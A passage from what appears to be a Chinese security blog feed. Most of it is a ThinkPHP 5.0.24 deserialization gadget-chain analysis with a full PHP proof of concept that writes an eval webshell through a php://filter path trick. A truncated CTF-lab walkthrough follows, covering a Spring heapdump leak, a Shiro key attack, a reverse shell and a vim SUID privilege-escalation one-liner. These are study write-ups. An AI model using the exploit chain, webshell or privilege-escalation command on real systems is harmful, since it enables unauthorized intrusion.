class="headerlink" title="修复方法"></a>修复方法</h2><p>官方是把Request的__call方法给除去了  那么链子的后半段就完全断掉了</p><h1 id="Thinkphp-5-0-24"><a href="#Thinkphp-5-0-24" class="headerlink" title="Thinkphp-5.0.24"></a>Thinkphp-5.0.24</h1><p>在5.0.24和5.0.18可用，5.0.9不可用</p><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://www.codejie.net/5913.html">https://www.codejie.net/5913.html</a></p><p>php7.3.4+xdebuger+thinkphp-5.0.24+phpstorm</p><p>该反序列化漏洞属于二次触发漏洞，需要有一个入口，因此我们将控制器中的Index控制器修改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240118140117639.png" alt="image-20240118140117639"></p><p>然后这样就搭建完成了</p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//__destruct</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pivot</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[] = <span class="variable">$pivot</span>; <span class="comment">//传入Pivot类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//__toString Model子类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Pivot</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$hasone</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$output</span>; <span class="comment">//$this-&gt;parent等于Output类</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="variable">$hasone</span>;   <span class="comment">//$modelRelation=$this-&gt;error</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getModel</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="variable">$output</span>; <span class="comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">handle</span> = <span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$memcached</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$memcached</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Relation</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span> = <span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$file</span>; <span class="comment">//$this-&gt;handler等于File类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [</span><br><span class="line">            &#x27;<span class="title class_">path</span>&#x27; =&gt; &#x27;<span class="title class_">php</span>://<span class="title class_">filter</span>/<span class="title class_">convert</span>.<span class="title class_">iconv</span>.<span class="title class_">utf</span>-8.<span class="title class_">utf</span>-7|<span class="title class_">convert</span>.<span class="title class_">base64</span>-<span class="title class_">decode</span>/<span class="title class_">resource</span>=<span class="title class_">aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g</span>/../<span class="title class_">a</span>.<span class="title class_">php</span>&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">cache_subdir</span>&#x27; =&gt; <span class="title class_">false</span>,</span><br><span class="line">            &#x27;<span class="title class_">prefix</span>&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">data_compress</span>&#x27; =&gt; <span class="title class_">false</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$memcached</span> = <span class="keyword">new</span> think\session\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$memcached</span>);</span><br><span class="line">    <span class="variable">$query</span> = <span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="variable">$hasone</span> = <span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$pivot</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$output</span>, <span class="variable">$hasone</span>);</span><br><span class="line">    <span class="variable">$windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="variable">$pivot</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成base64编码后直接打</p><p><img src="../images/image-20240118140400694.png" alt="image-20240118140400694"></p><p>执行后会在当前目录下生成两个文件</p><p><img src="../images/image-20240118140426841.png" alt="image-20240118140426841"></p><p><img src="../images/image-20240118140454334.png" alt="image-20240118140454334"></p><p>然后访问就行了</p><p><img src="../images/image-20240118140515870.png" alt="image-20240118140515870"></p><p>成功RCE</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="../images/image-20240118140640755.png" alt="image-20240118140640755"></p><p>在此处下个断点  前面的话和刚刚5.1.37那条链子还是一样的  主要是后面不太相同</p><p><img src="../images/image-20240118141135360.png" alt="image-20240118141135360"></p><p>然后还是进入到这个windows这个类中  还是得跟进到removeFiles方法中</p><p><img src="../images/image-20240118141656177.png" alt="image-20240118141656177"></p><p>跟进到这个removeFiles中  然后原因也和5.1的版本是一样的  filename是pivot对象  所以直接会调用到toString方法  但是这里没有Conversion这个类  所以会直接调用到Model这个类中的toString方法</p><p><img src="../images/image-20240118141939561.png" alt="image-20240118141939561"></p><p>进入toJson方法中  </p><p><img src="../images/image-20240118142026967.png" alt="image-20240118142026967"></p><p>然后接着进入到toArray这个方法中</p><p><img src="../images/image-20240118142050860.png" alt="image-20240118142050860"></p><p>在我们进入到这个toArray以后  接下来的操作就和5.1版本的就不同了  </p><p><img src="../images/image-20240118142628151.png" alt="image-20240118142628151"></p><p>这是等会我们需要用到的4个重要的函数方法  我们先跟进这个parseName方法  来看这个$relation是怎么获取到的</p><p><img src="../images/image-20240118142924503.png" alt="image-20240118142924503"></p><p><img src="../images/image-20240118142907106.png" alt="image-20240118142907106"></p><p>进入到parseName后  我们获取到其relation的值为getError函数  并且Model类中存在这个函数  那么我们就会进入到这个Method_exists方法中</p><p><img src="../images/image-20240118143146658.png" alt="image-20240118143146658"></p><p>这里的话就会调用这个getError方法 来给modelRelation赋值  我们跟进这个relation方法中</p><p><img src="../images/image-20240118143308014.png" alt="image-20240118143308014"></p><p>这里的话是返回HashOne这个类  (因为可控 我们设置成了HashOne)</p><p><img src="../images/image-20240118143511444.png" alt="image-20240118143511444"></p><p>这里Model是Pivot的父类</p><p><img src="../images/image-20240118143544250.png" alt="image-20240118143544250"></p><p>然后我们就可以在pivot中队Model的error参数赋值  这就是error可控的原因 </p><p><img src="../images/image-20240118143813631.png" alt="image-20240118143813631"></p><p>进入到getRalationData中  这个函数的返回结果是对$value的赋值  然而通过代码 我们发现其要进入到给$value赋值需要三个条件</p><ul><li>$this-&gt;parent</li><li>!$modelRelation-&gt;isSelfRelation()</li><li>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</li></ul><p><strong>条件一</strong></p><p>首先我们要知道在toString这一步我们需要做什么，5.1版本是触发了<strong>call方法，那么这里我们也应该寻找能否找到合适的call方法，最后结果就是<code>think\console\Output</code>类，那么我们应该让这个方法返回一个Output对象，这样在出去之后执行<code>$value-&gt;getAttr($attr)</code>才会触发`</strong>call<code>魔术方法，而该方法中value的值就是</code>$this-&gt;parent`，所以第一个条件parent需要为Output对象</p><p><strong>条件二</strong></p><p>对于第二个条件，<code>$modelRelation</code>我们已经完成了赋值，为<code>HasOne</code>对象，我们观察一下</p><p><img src="../images/image-20240118144542810.png" alt="image-20240118144542810"></p><p>先看看HasOne对象   继承于OneToOne对象  然后跟进OneToOne对象</p><p><img src="../images/image-20240118144635007.png" alt="image-20240118144635007"></p><p>然后发现这个OneToOne继承于Relation对象</p><p><img src="../images/image-20240118144711774.png" alt="image-20240118144711774"></p><p>然后我们发现这个isSelfRelation函数就是在Relation这个类中  那么我们就可以直接在HasOne这个类中定义这个selfRelation的值了  只需让他为false即可</p><p><strong>条件三</strong></p><p>最后一个条件需要让<code>Hasone::getModel</code>返回一个Output对象($this-&gt;parent)，观察该方法：</p><p><img src="../images/image-20240118144956361.png" alt="image-20240118144956361"></p><p>直接调用其父类中的getModel方法  并且这个$this-&gt;query可控  所以我们接着去全局寻找谁的getModel方法能够返回Output对象</p><p><img src="../images/image-20240118145143837.png" alt="image-20240118145143837"></p><p><code>/thinkphp/library/think/db/Query.php</code>中的getModel方法我们可控：  所以条件三也满足</p><p>在这里只需要让<code>this-&gt;query==thinkphp/library/thinl/db/Query.php</code>即可，然后让他的model属性为<code>Output</code>对象</p><p><img src="../images/image-20240118145258277.png" alt="image-20240118145258277"></p><p>满足条件  成功给$value赋值为Output对象  然后我们进入到getBindAttr方法中</p><p><img src="../images/image-20240118145517139.png" alt="image-20240118145517139"></p><p>直接进入到HasOne的父类OneToOne的getBindAttr中</p><p>返回HasOne对象的bindAttr属性，这里我们设置为一个数组<code>[&quot;a&quot;=&gt;&quot;admin&quot;]</code>，这里的admin和结果中的文件名有关</p><p><img src="../images/image-20240118145733563.png" alt="image-20240118145733563"></p><p>这里的话对我们输入的$bindAttr进行遍历  然后因为$value是我们之前设置的Output类  然后这个类中没有getAttr方法  于是就会进入到这个类的__call方法中</p><p><img src="../images/image-20240118150350008.png" alt="image-20240118150350008"></p><p>进入到这个call方法中的时候  有点和5.1类似的地方了</p><p><img src="../images/image-20240118150521050.png" alt="image-20240118150521050"></p><p>用array_shift方法将method和args结合在了一起，随后调用<code>call_user_func_array</code>方法调用了自己的block方法，跟进该方法：</p><p><img src="../images/image-20240118150647367.png" alt="image-20240118150647367"></p><p>然后接着跟进这个writeln方法中  message是admin</p><p><img src="../images/image-20240118150729940.png" alt="image-20240118150729940"></p><p>其他参数不变  message还是为admin   然后我们接着跟进这个write方法中</p><p><img src="../images/image-20240118150821402.png" alt="image-20240118150821402"></p><p>然后我们发现了这个handle可控  我们全局找write方法   最终在<code>Memcached</code>类找到合适的write方法，因此让Output的handle属性为<code>Memcached</code>类：</p><p><img src="../images/image-20240118150928189.png" alt="image-20240118150928189"></p><p>调用到了这个Memcached类中的write方法  还调用了set方法，再找谁调用了set，最终在<code>think/cache/driver/File</code>类找到了，因此让Memcache对象的handler属性变为File对象，最后触发它的set方法，参数为上面带下来的：</p><p><img src="../images/image-20240118151029284.png" alt="image-20240118151029284"></p><p><img src="../images/image-20240118151110533.png" alt="image-20240118151110533"></p><p>然后我们发现这个类中有个file_put_contents函数   但是有个前提是得绕过这个死亡exit  不然会终止进程  导致内容写不进去</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">死亡die绕过</a></p><p><img src="../images/image-20240118151527670.png" alt="image-20240118151527670"></p><p>这里的话我们跟进这个getCacheKey函数  因为我们的filename是通过这个函数来获取的</p><p><img src="../images/image-20240118151619990.png" alt="image-20240118151619990"></p><p>这个name的话是我们在前面的传入的值 <code>&lt;getAttr&gt;admini&lt;getAttr&gt;</code>  的md5值</p><p>其中<code>this-&gt;options[&#39;path&#39;]</code>是我们可控的，这里让他为<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code>可以绕过死亡函数</p><p>但是我们要注意，即使可控文件名，但是文件内容<code>$data</code>，也就是<code>$value</code>在这一次进入set方法不可控，为默认的<code>true</code>，因此即使能创建文件也不能写马<br>继续往下分析会调用</p><p><img src="../images/image-20240118152131600.png" alt="image-20240118152131600"></p><p>这里的返回名字是 <code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</code>   </p><p>但是这里的data我们不可控     所以没有办法  我们进入到下面的if后  我们发现还有个setTagItem函数  然后我们跟进</p><p><img src="../images/image-20240118152244714.png" alt="image-20240118152244714"></p><p><img src="../images/image-20240118153005523.png" alt="image-20240118153005523"></p><p>然后这个会再次进入到这个set方法中  并且这个key和value值1可控  那么就会再次执行fileputcontent函数  就会再次写入值</p><p>第二个文件名就是<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php+md5(tag_c4ca4238a0b923820dcc509a6f75849b)+.php</code></p><p>第二个可控是因为这个filename和data的值是一样的  传入的时候</p><p><a href="https://xz.aliyun.com/t/7457?time__1311=n4%2BxnD0G0%3Dit0QDkDcnDlhjmP8twK%3DTYr%3Dd4D&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F7457%2523toc-3">https://xz.aliyun.com/t/7457?time__1311=n4%2BxnD0G0%3Dit0QDkDcnDlhjmP8twK%3DTYr%3Dd4D&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F7457%2523toc-3</a></p><p>这篇文章解释了为什么能能在windows下使用phpfilter生成文件的原因</p><p><img src="../images/image-20240118153216548.png" alt="image-20240118153216548"></p><p><img src="../images/image-20240118153252600.png" alt="image-20240118153252600"></p><p>这个就是专门生成写入的值   然后这里就完成FW了</p><p>这里贴一张链子图</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677554303467-3637e100-8061-4dc9-afb8-b7197601b72a.png#averageHue=%230f3b3e&amp;clientId=ucdcb2c75-f9bd-4&amp;from=paste&amp;height=2437&amp;id=u0dd4d63a&amp;name=20221011115008-ccb4a1ce-4917-1.png&amp;originHeight=3046&amp;originWidth=1799&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=746691&amp;status=done&amp;style=none&amp;taskId=ud496bfd7-66ed-4853-8185-4d591fc56ed&amp;title=&amp;width=1439.2" alt="20221011115008-ccb4a1ce-4917-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;实习的时候审代码发现自己对这种反序列化链的寻找能力不太行  于是去找个thinkphp的链子来学习学习&lt;/p&gt;
&lt;p&gt;参考文章  &lt;a href=&quot;https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E</summary>
      
    
    
    
    
    <category term="php" scheme="https://ke1nys.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Hospital</title>
    <link href="https://ke1nys.github.io/posts/d66aab01.html"/>
    <id>https://ke1nys.github.io/posts/d66aab01.html</id>
    <published>2024-01-14T10:01:42.000Z</published>
    <updated>2024-01-20T15:32:19.408Z</updated>
    
    <content type="html"><![CDATA[<p>参考   <a href="https://www.cnblogs.com/thebeastofwar/p/17939471">https://www.cnblogs.com/thebeastofwar/p/17939471</a></p><p>先用fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 39.99.253.63    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">39.99.253.63:22 open</span><br><span class="line">39.99.253.63:8080 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://39.99.253.63:8080  code:302 len:0      title:None 跳转url: http://39.99.253.63:8080/login;jsessionid=3E0908F84358B2D6BB6961A2EDEA7698</span><br><span class="line">[*] WebTitle: http://39.99.253.63:8080/login;jsessionid=3E0908F84358B2D6BB6961A2EDEA7698 code:200 len:2005   title:医疗管理后台</span><br><span class="line">[+] http://39.99.253.63:8080 poc-yaml-spring-actuator-heapdump-file</span><br></pre></td></tr></table></figure><p>直接给出poc了</p><p>就是一个spring的heapdump泄露   然后就去找工具来分析泄露的信息</p><p><img src="../images/image-20240114180342083.png" alt="image-20240114180342083"></p><p>这里不建议使用这个工具  因为这个工具给出的shirokey是错的  (tmd)</p><p>然后选个别的工具</p><p><a href="https://github.com/whwlsfb/JDumpSpider/release">https://github.com/whwlsfb/JDumpSpider/release</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114180522672.png" alt="image-20240114180522672"></p><p>这个就是对的  然后就去找那种gui工具直接打就行  <strong>(这样方便一点)</strong></p><p>我这里用的是这个工具</p><p><img src="../images/image-20240114180629106.png" alt="image-20240114180629106"></p><p><img src="../images/image-20240114180648754.png" alt="image-20240114180648754"></p><p>填入地址和密钥  然后直接打就行  然后写个内存马  用冰蝎来连接  </p><p><img src="../images/image-20240114180734537.png" alt="image-20240114180734537"></p><p><img src="../images/image-20240114180748494.png" alt="image-20240114180748494"></p><p>然后弹个shell到自己的vps上 </p><p>进行suid提权</p><p>这里发现是vim 然后去提权网站上看找到poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后拿flag并且写rsa后门就行了</p><p><img src="../images/image-20240114180958290.png" alt="image-20240114180958290"></p><p>然后开始扫内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 